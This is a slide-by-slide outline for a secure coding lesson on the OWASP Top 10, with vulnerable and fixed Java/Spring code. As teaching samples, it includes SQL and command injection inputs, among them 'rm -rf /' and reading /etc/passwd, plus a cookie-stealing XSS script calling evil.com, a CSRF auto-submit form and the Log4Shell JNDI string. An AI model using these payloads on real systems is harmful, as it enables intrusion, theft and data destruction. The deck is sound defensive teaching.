# Day 29 Part 1 — Secure Coding & OWASP Top 10
## Slide Descriptions

---

### Slide 1 — Title Slide

**Title:** Day 29 Part 1: Secure Coding & the OWASP Top 10

**Subtitle:** Writing code that survives contact with the real world

**Learning Objectives:**
- Explain why security is a design principle, not a feature to add at the end
- Apply core secure coding principles (least privilege, defense in depth, fail securely)
- Identify all ten OWASP Top 10 vulnerability categories (2021 edition)
- Understand SQL injection and command injection mechanics and prevention
- Defend against Cross-Site Scripting (XSS) with output encoding and CSP
- Understand CSRF attack flow and the CSRF token prevention pattern
- Recognize security misconfiguration and sensitive data exposure in real applications

---

### Slide 2 — The Cost of Getting Security Wrong

**Title:** Security Is Not Optional

**Content:**

A data breach table showing real costs:

| Metric | Value |
|--------|-------|
| Average cost of a data breach (IBM 2023) | $4.45 million |
| Cost to fix a bug at design time | $1 |
| Cost to fix a bug in testing | $100× more |
| Cost to fix a bug in production | $1,000–10,000× more |
| Records exposed in the Equifax breach (2017) | 147 million |
| Cause of the Equifax breach | Unpatched Apache Struts CVE (known for months) |

**Key message bullets:**
- Security failures are not theoretical — they happen at every company, at every scale
- Security debt compounds: a vulnerability ignored in design costs exponentially more to fix in production
- The Equifax breach was caused by a patched vulnerability that the team simply never applied — not a sophisticated zero-day
- **Security is a first-class design concern from line 1 of code — not a phase at the end**

---

### Slide 3 — Secure Coding Principles

**Title:** The Principles That Prevent Most Vulnerabilities

**Content:**

Seven foundational principles, each with a one-line definition and an example:

| Principle | Definition | Example |
|-----------|------------|---------|
| **Least Privilege** | Every component/user/process gets only the access it needs — nothing more | A service that reads users should have SELECT only, not DROP TABLE |
| **Defense in Depth** | Layer security controls — no single point of failure | Validate input AND use parameterized queries AND sanitize output |
| **Fail Securely** | When something goes wrong, default to deny, not allow | An exception in auth check should lock the door, not open it |
| **Don't Trust Input** | Treat all input as hostile until validated — users, APIs, databases, environment variables | Never concatenate URL params directly into SQL |
| **Security by Default** | The default configuration should be the most secure | Ship with all features disabled; require explicit opt-in |
| **Keep It Simple** | Complexity is the enemy of security — every line is an attack surface | Prefer simple, well-understood libraries over clever custom solutions |
| **Avoid Security Through Obscurity** | Hiding your code or structure is not a security control | "Nobody knows our API endpoint format" is not authorization |

**Bottom line:** these principles reduce your attack surface and contain the blast radius when something does go wrong.

---

### Slide 4 — OWASP and the Top 10 (2021)

**Title:** OWASP Top 10 — The Industry Standard Vulnerability List

**Left panel — What is OWASP:**
- **Open Web Application Security Project** — non-profit foundation, free resources
- Trusted by developers, auditors, and compliance frameworks worldwide
- The Top 10 is updated every 3–4 years based on real vulnerability data from thousands of applications
- Used as a baseline for security audits, penetration testing, and compliance (PCI-DSS, SOC 2)

**Right panel — The 2021 Top 10:**

| ID | Category | Key shift from 2017 |
|----|----------|---------------------|
| **A01** | Broken Access Control | ↑ from #5 — most widespread |
| **A02** | Cryptographic Failures | Renamed from "Sensitive Data Exposure" |
| **A03** | Injection | ↓ from #1 — now includes XSS |
| **A04** | Insecure Design | NEW — design-time security |
| **A05** | Security Misconfiguration | ↑ — cloud misconfig drives this |
| **A06** | Vulnerable and Outdated Components | ↑ — Log4Shell made this real |
| **A07** | Identification and Authentication Failures | ↓ from #2 |
| **A08** | Software and Data Integrity Failures | NEW — includes SolarWinds-type attacks |
| **A09** | Security Logging and Monitoring Failures | Renamed |
| **A10** | Server-Side Request Forgery (SSRF) | NEW |

---

### Slide 5 — A01: Broken Access Control

**Title:** A01 — Broken Access Control: The #1 Vulnerability

**Content:**

Broken Access Control means a user can do something they shouldn't be able to do.

**Two attack types:**

| Type | Description | Example |
|------|-------------|---------|
| **Vertical escalation** | Lower-privilege user accesses higher-privilege functionality | A regular user calls `/api/admin/users/delete` |
| **Horizontal escalation** | User A accesses User B's data | Change URL from `/api/orders/1234` to `/api/orders/1235` |

**IDOR — Insecure Direct Object Reference:**
The URL/parameter directly references a database ID, and the server doesn't verify the requesting user owns that resource:
```
GET /api/orders/12345   → your order
GET /api/orders/12346   → someone else's order — server returns it anyway
```

**Vulnerable code:**
```java
// ❌ No ownership check — any authenticated user can read any order
@GetMapping("/api/orders/{id}")
public OrderDto getOrder(@PathVariable Long id) {
    return orderService.findById(id);   // no check that this belongs to the caller
}
```

**Secure code:**
```java
// ✅ Verify ownership before returning
@GetMapping("/api/orders/{id}")
public OrderDto getOrder(@PathVariable Long id, Authentication auth) {
    OrderDto order = orderService.findById(id);
    if (!order.getUsername().equals(auth.getName())) {
        throw new AccessDeniedException("You do not own this order");
    }
    return order;
}
```

**Prevention checklist:**
- Deny by default — authenticated users can only do what's explicitly permitted, server-side
- Check authorization on every state-changing request
- Use UUIDs instead of sequential integers for sensitive resource IDs (harder to enumerate)
- Server-side enforcement only — client-side checks (hiding a button) are not security

---

### Slide 6 — A02: Cryptographic Failures (Sensitive Data Exposure)

**Title:** A02 — Cryptographic Failures: Protecting Data at Rest and in Transit

**Content:**

What falls under Cryptographic Failures:
- Passwords stored in plaintext or with weak algorithms (MD5, SHA-1)
- Data transmitted over HTTP instead of HTTPS
- Weak or deprecated encryption algorithms (DES, 3DES, RC4)
- Hardcoded encryption keys or API secrets in source code
- Unnecessarily retaining sensitive data beyond its use

**What needs protecting:**

| Data Type | Why |
|-----------|-----|
| Passwords | If breached, gives attacker access to the account |
| Credit card numbers | PCI-DSS compliance; financial fraud |
| Social Security Numbers / National IDs | Identity theft |
| Health records | HIPAA compliance; personal harm |
| API keys and tokens | Full access to connected services |
| Session tokens | Impersonation of the user |

**Prevention:**
- **HTTPS everywhere** — configure HSTS so browsers refuse plain HTTP connections
- **Never MD5/SHA-1 for passwords** — these are fast algorithms; BCrypt, Argon2, or scrypt only
- **Encrypt sensitive data at rest** — AES-256 for database fields containing PII
- **Never store data you don't need** — don't retain card numbers after authorization
- **No secrets in source code** — use environment variables or a secret manager (Vault, AWS Secrets Manager)
- **Rotate secrets on a schedule** — API keys, DB passwords, encryption keys

---

### Slide 7 — A03: SQL Injection

**Title:** A03 — SQL Injection: When Input Becomes Code

**Content:**

**What it is:** User-supplied input is concatenated directly into a SQL query. The database cannot distinguish between the query structure and the attacker's injected commands.

**Vulnerable example:**
```java
// ❌ VULNERABLE — attacker controls the SQL
String query = "SELECT * FROM users WHERE username = '" + username + "'";

// Normal input:    username = "alice"
// Result: SELECT * FROM users WHERE username = 'alice'   ← fine

// Attack input:    username = "' OR '1'='1"
// Result: SELECT * FROM users WHERE username = '' OR '1'='1'
// '1'='1' is always true → returns ALL rows → full user table exposed

// Even worse:      username = "'; DROP TABLE users; --"
// Result: SELECT * FROM users WHERE username = ''; DROP TABLE users; --
```

**Safe alternatives:**

```java
// ✅ PreparedStatement — parameterized query
String sql = "SELECT * FROM users WHERE username = ?";
PreparedStatement stmt = connection.prepareStatement(sql);
stmt.setString(1, username);   // username is DATA, never CODE

// ✅ Spring Data JPA derived query — parameterized automatically
Optional<User> findByUsername(String username);

// ✅ JPQL with named parameter — parameterized
@Query("SELECT u FROM User u WHERE u.username = :username")
Optional<User> findByUsername(@Param("username") String username);

// ✅ Native query with named parameter
@Query(value = "SELECT * FROM users WHERE username = :username", nativeQuery = true)
Optional<User> findByUsernameNative(@Param("username") String username);
```

**The rule:** never concatenate user input into a SQL string. Parameterized queries are not optional — they are the only safe approach.

---

### Slide 8 — A03: Command Injection

**Title:** A03 — Command Injection: When Input Controls the OS

**Content:**

**What it is:** User input is passed to an OS shell command. The shell interprets special characters (`; | && > < \``) as command separators and operators.

**Vulnerable example:**
```java
// ❌ VULNERABLE — passes input to shell as a single string
String filename = request.getParameter("file");
Runtime.getRuntime().exec("ls " + filename);

// Normal input:  filename = "documents"
// Runs: ls documents   ← fine

// Attack input:  filename = "documents; cat /etc/passwd"
// Runs: ls documents; cat /etc/passwd  ← reads system password file

// Attack input:  filename = ". ; rm -rf /"
// Runs: ls .; rm -rf /   ← destroys the filesystem
```

**Safe alternatives:**
```java
// ✅ BEST — use Java APIs instead of shell commands
// Instead of exec("ls /uploads"), use:
List<Path> files = Files.list(Paths.get("/uploads")).collect(Collectors.toList());

// ✅ If an OS command is truly unavoidable — ProcessBuilder with separate args
// Arguments are passed directly to the process, NOT through a shell
// Shell metacharacters are NOT interpreted
ProcessBuilder pb = new ProcessBuilder("ls", "-la", userSuppliedDirectory);
pb.redirectErrorStream(true);
Process process = pb.start();

// ❌ STILL WRONG — even with ProcessBuilder, passing as one string uses shell
new ProcessBuilder("ls -la " + userSuppliedDirectory);  // DON'T DO THIS
```

**Prevention:**
- Prefer Java APIs (Files, Paths, etc.) over shell commands
- If shell commands are required, use `ProcessBuilder` with arguments as separate array elements
- Whitelist allowed inputs when possible (validate `filename` matches `^[a-zA-Z0-9_.-]+$`)

---

### Slide 9 — A07: Identification and Authentication Failures

**Title:** A07 — Authentication Failures: Breaking the Front Door

**Content:**

What falls under authentication failures:

| Vulnerability | Description |
|---------------|-------------|
| **Weak passwords allowed** | No enforcement of length, complexity |
| **No brute-force protection** | Unlimited login attempts — attacker scripts 10,000 passwords/minute |
| **Credential stuffing** | Attacker takes leaked username/password pairs from other breaches and tries them on your site |
| **Session IDs in URLs** | `/app?session=abc123` — shows up in browser history, server logs, referrer headers |
| **Session not invalidated on logout** | Old session tokens still work after the user logs out |
| **Session fixation** | Attacker sets a known session ID before login; victim logs in; attacker now has an authenticated session |
| **Predictable session tokens** | Sequential or guessable session IDs |
| **No MFA for sensitive operations** | Changing passwords, large transactions, admin actions |

**Prevention:**
- **Rate limiting / account lockout** — lock account after N failed attempts (5–10); CAPTCHA after 3
- **Force logout = invalidate server-side session** — don't rely on deleting the client cookie
- **Regenerate session ID on login** — prevents session fixation
- **HttpOnly + Secure cookies** — JavaScript can't read them; only sent over HTTPS
- **Strong password requirements** — minimum 12 characters; check against known-breached password lists
- **MFA** — time-based one-time passwords (TOTP) for admin accounts and sensitive operations

---

### Slide 10 — Cross-Site Scripting (XSS)

**Title:** XSS — Injecting Scripts into Other Users' Browsers

**Content:**

**What it is:** An attacker injects malicious JavaScript into a page that is then executed in other users' browsers. The browser trusts scripts from the site's domain — if the site serves the attacker's script, the browser runs it.

**Three XSS types:**

| Type | How | Example |
|------|-----|---------|
| **Stored XSS** | Script is saved in the database; served to every user who views that content | Book review containing `<script>` tags |
| **Reflected XSS** | Script is in the URL; victim is tricked into clicking a crafted link | `https://site.com/search?q=<script>...` |
| **DOM-based XSS** | JavaScript reads from a tainted source (URL fragment) and writes to the DOM without server involvement | `document.write(location.hash)` |

**Attack example:**
```html
<!-- Attacker submits this as a book review -->
<script>
  document.location = 'https://evil.com/steal?c=' + document.cookie;
</script>

<!-- Every user who views the book's reviews page has their session cookie stolen -->
<!-- Attacker can now impersonate all those users -->
```

**Prevention:**

| Control | How |
|---------|-----|
| **Output encoding** | Convert `<`, `>`, `"`, `'`, `&` → HTML entities before rendering user content |
| **Templating engine auto-escape** | Thymeleaf and React JSX auto-escape by default — don't bypass with `th:utext` or `dangerouslySetInnerHTML` |
| **Content Security Policy (CSP)** | HTTP header: `Content-Security-Policy: default-src 'self'` — browser only executes scripts from your domain |
| **HttpOnly cookies** | JavaScript cannot access the cookie even if XSS executes — steals the cookie but can't steal the session |
| **Avoid `innerHTML`** | Never set `element.innerHTML = userInput` — use `textContent` instead |

---

### Slide 11 — Cross-Site Request Forgery (CSRF)

**Title:** CSRF — Making the User's Browser Do Things They Didn't Intend

**Content:**

**What it is:** An attacker tricks an authenticated user's browser into making a forged request to a trusted site. The browser automatically includes the session cookie, so the server sees a legitimate authenticated request.

**Step-by-step attack flow:**

```
Step 1: User logs into bankapp.com
        Browser stores: Session-Cookie: abc123 (HttpOnly)

Step 2: User visits evil.com (malicious site or email link)
        evil.com contains a hidden auto-submitting form:

        <form action="https://bankapp.com/transfer" method="POST" id="f">
            <input name="to"     value="attacker-account-9999">
            <input name="amount" value="5000">
        </form>
        <script>document.getElementById('f').submit();</script>

Step 3: Browser submits the form to bankapp.com
        Browser automatically includes: Session-Cookie: abc123
        bankapp.com receives an authenticated POST /transfer request

Step 4: Bank transfers $5,000 — the user never initiated this
```

**Prevention:**

| Method | How it works |
|--------|--------------|
| **CSRF token** | Server generates a unique, unguessable token per session; every state-changing form must include it; server validates it on receipt — attacker on evil.com cannot know or forge this token |
| **SameSite cookie attribute** | `SameSite=Lax` or `Strict` — browser won't send the cookie when the request originates from a different site |
| **Double Submit Cookie** | For AJAX: server sets a CSRF token in a readable cookie; client reads it and sends it as a header; server compares both — cross-site requests cannot read the cookie |

**Spring Security:** CSRF protection is **enabled by default** for web applications. Part 2 covers how to configure it for both traditional web apps and REST APIs.

---

### Slide 12 — A05: Security Misconfiguration

**Title:** A05 — Security Misconfiguration: The Most Common Real-World Finding

**Content:**

Security misconfiguration is the gap between how a system *should* be configured and how it *actually* is. It's the most common finding in penetration tests because it requires no hacking — just looking.

**Real-world examples:**

| Misconfiguration | Consequence |
|-----------------|-------------|
| Default credentials left in place (`admin/admin`) | Full admin access without any attack |
| Stack traces returned to users on errors | Exposes framework versions, file paths, database schema |
| Spring Boot Actuator `/actuator/*` publicly accessible | `/actuator/env` shows all environment variables (passwords!) |
| H2 console enabled in production | Full DB access at `http://prod-server/h2-console` |
| AWS S3 bucket set to public | All stored files publicly downloadable |
| Debug mode enabled in production | May enable remote code execution |
| CORS configured as `*` | Any website can make authenticated requests to your API |
| Unnecessary HTTP methods enabled | `TRACE`, `OPTIONS` can expose server internals |

**Prevention:**
- Environment-specific configuration — dev and prod NEVER share settings
- Disable H2 console, debug logs, and verbose error messages before production
- Review Spring Boot Actuator exposure — `/actuator/*` must require authentication in production
- Automated security scanning in CI/CD — OWASP ZAP, Trivy
- Review cloud resource permissions before every deployment

**Spring Boot property to disable H2 console in non-dev:**
```properties
# application-prod.properties
spring.h2.console.enabled=false
server.error.include-stacktrace=never
server.error.include-message=never
```

---

### Slide 13 — A06: Vulnerable and Outdated Components

**Title:** A06 — Vulnerable Components: Log4Shell and Why Dependencies Matter

**Content:**

**The Log4Shell story:**
- December 2021: CVE-2021-44228 disclosed in Log4j (logging library used by essentially every Java application)
- CVSS score: **10.0** — the highest possible severity
- A single line in a log message could execute arbitrary code on the server:
  ```
  ${jndi:ldap://attacker.com/exploit}
  ```
  This appears in a username field, a User-Agent header, anywhere that gets logged
- Hundreds of thousands of applications were vulnerable — including applications that didn't even know they had Log4j because it was a transitive dependency of another dependency

**The problem in most teams:**
```
Your App → depends on → Library A → depends on → Library B → depends on → Log4j
                                                              (you didn't know this existed)
```

**Prevention:**
```xml
<!-- Run OWASP Dependency-Check to scan for known CVEs -->
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>9.0.0</version>
</plugin>
```

```bash
mvn dependency:tree              # see ALL dependencies, including transitive
mvn dependency-check:check       # scan against CVE database, fail build if found
```

**Process controls:**
- Know your full dependency tree, including transitive dependencies
- Subscribe to security advisories for Spring, Java, and frameworks you use
- Keep dependencies current — especially security-relevant ones (Spring Security, Jackson, Log4j)
- Remove unused dependencies — less code = smaller attack surface

---

### Slide 14 — A09, A04 and Security Logging

**Title:** A09 — Security Logging Failures & A04 — Insecure Design

**Left panel — A09: Security Logging and Monitoring Failures:**

Security events you **must** log:
- Authentication attempts (success AND failure)
- Authorization failures (access denied events)
- Input validation failures
- Password change and privilege escalation events

What to **never** log:
- Passwords (even hashed ones)
- Session tokens and JWTs
- Credit card numbers
- Full Social Security Numbers

**Log injection — a subtle attack:**
```
Attacker enters username: admin\nINFO 2025-01-01 Login successful for admin
```
The newline character (`\n`) forges a fake log entry. Prevention: sanitize log inputs, use structured logging (JSON format, not string concatenation into log messages).

**Right panel — A04: Insecure Design:**

The 2021 addition. Security must be considered at **design time**, not patched in after.

Threat modeling questions for every feature:
- "What happens if an attacker calls this endpoint 10,000 times a second?"
- "What if two users perform this operation simultaneously?"
- "What if the external service this calls returns malicious data?"
- "What's the worst thing a legitimate user could do with this feature?"

**Example of insecure design:** Password reset via secret question ("What was your first pet's name?") — social media makes these guessable. Secure design: time-limited reset link sent to verified email, expires after 15 minutes, single use.

---

### Slide 15 — HTTP Security Headers

**Title:** Security Headers — Telling the Browser How to Behave

**Content:**

HTTP response headers that instruct the browser on security policies. These are your last line of defense against certain attack classes — they reduce impact when other controls fail.

| Header | Recommended Value | Protection |
|--------|-------------------|------------|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Force HTTPS — browser refuses HTTP connections for 1 year |
| `X-Frame-Options` | `DENY` | Prevent clickjacking — page cannot be embedded in an `<iframe>` |
| `X-Content-Type-Options` | `nosniff` | Prevent MIME sniffing — browser respects declared Content-Type |
| `Content-Security-Policy` | `default-src 'self'` | Control which scripts, styles, images are allowed to load |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Control how much referrer info is sent cross-origin |
| `Permissions-Policy` | `geolocation=(), camera=(), microphone=()` | Disable browser features the app doesn't need |

**Spring Security adds several automatically:**
```java
http.headers(headers -> headers
    .frameOptions(frame -> frame.deny())                       // X-Frame-Options: DENY
    .contentTypeOptions(Customizer.withDefaults())             // X-Content-Type-Options: nosniff
    .httpStrictTransportSecurity(hsts -> hsts
        .maxAgeInSeconds(31536000)
        .includeSubDomains(true))
    .contentSecurityPolicy(csp -> csp
        .policyDirectives("default-src 'self'; script-src 'self'"))
);
```

**Clickjacking explained:** An attacker loads your site in a transparent `<iframe>` over a fake "Win a prize!" button. When the user clicks "Win a prize!", they actually click on the invisible button on your site (e.g., "Confirm transfer"). `X-Frame-Options: DENY` prevents any framing.

---

### Slide 16 — Part 1 Summary

**Title:** Part 1 Summary — Your OWASP Reference Sheet

**Content:**

**Secure Coding Principles:**
- Least privilege, defense in depth, fail securely, don't trust input, security by default

**OWASP Top 10 Quick Reference:**

| Rank | Vulnerability | Key Prevention |
|------|--------------|---------------|
| A01 | Broken Access Control | Server-side auth checks on every request; deny by default; ownership verification |
| A02 | Cryptographic Failures | HTTPS + HSTS; BCrypt for passwords; AES-256 at rest; no secrets in code |
| A03 | Injection (SQL, Command) | Parameterized queries always; Java APIs over shell commands; ProcessBuilder with args |
| A04 | Insecure Design | Threat model at design time; secure design patterns |
| A05 | Security Misconfiguration | Env-specific config; disable dev features in prod; automated scanning |
| A06 | Vulnerable Components | `mvn dependency-check:check`; keep deps current; know transitive deps |
| A07 | Auth Failures | Rate limiting; server-side logout; session regeneration; MFA |
| A08 | Software Integrity Failures | Verify supply chain; signed artifacts |
| A09 | Logging Failures | Log auth events; never log secrets; structured logging |
| A10 | SSRF | Validate and whitelist outbound URLs; block internal IP ranges |
| XSS | Cross-Site Scripting | Output encoding; CSP header; HttpOnly cookies; no innerHTML |
| CSRF | Cross-Site Request Forgery | CSRF tokens; SameSite cookies |

**Part 2 Preview:**
Spring Security in practice — the filter chain architecture, `SecurityFilterChain` configuration, in-memory and database-backed authentication, `BCryptPasswordEncoder`, `UserDetailsService`, and CSRF protection configuration. From OWASP principles to the Spring framework that enforces them.
